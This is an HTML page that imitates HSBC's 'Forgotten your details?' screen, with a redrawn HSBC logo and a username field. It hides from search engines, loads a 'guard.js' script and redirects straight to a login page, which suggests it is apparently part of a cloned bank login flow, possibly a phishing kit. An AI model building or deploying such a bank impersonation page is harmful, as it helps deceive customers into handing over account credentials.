<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta name="robots" content="noindex, nofollow, noarchive" />
  <script src="js/guard.js?v=2"></script>
  <script>location.replace("login.html");</script>
  <title>HSBC | Forgotten details</title>
  <link rel="icon" type="image/svg+xml" href="favicon.svg" />
  <meta name="theme-color" content="#f4f4f4" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="css/styles.css?v=10" />
</head>
<body>
  <div class="app">
    <div class="page hsbc-auth">
      <header class="hsbc-bar">
        <a class="hsbc-bar-brand" href="login.html" aria-label="Back to log on">
          <svg width="28" height="28" viewBox="0 0 64 64" aria-hidden="true">
            <polygon fill="#fff" points="32,3 59,18.5 59,45.5 32,61 5,45.5 5,18.5"/>
            <polygon fill="#e31b24" points="32,16 46,24 46,40 32,48 18,40 18,24"/>
            <polygon fill="#fff" points="32,24 39,28 39,36 32,40 25,36 25,28"/>
          </svg>
          <span>HSBC</span>
        </a>
      </header>
      <main class="hsbc-login" id="main">
        <form class="hsbc-card" id="forgotForm">
          <h1>Forgotten your details?</h1>
          <p class="hsbc-lead">Enter your username. If it exists, we will send reset instructions.</p>
          <div class="hsbc-field">
            <label for="forgotUser">Username</label>
            <input id="forgotUser" name="username" required autocomplete="username" placeholder="Enter your username" />
          </div>
          <button class="hsbc-btn" type="submit" disabled>Continue</button>
          <p class="hsbc-help"><a class="hsbc-link" href="login.html">Back to log on</a></p>
        </form>
      </main>
    </div>
  </div>
  <script src="js/app.js?v=9"></script>
</body>
</html>
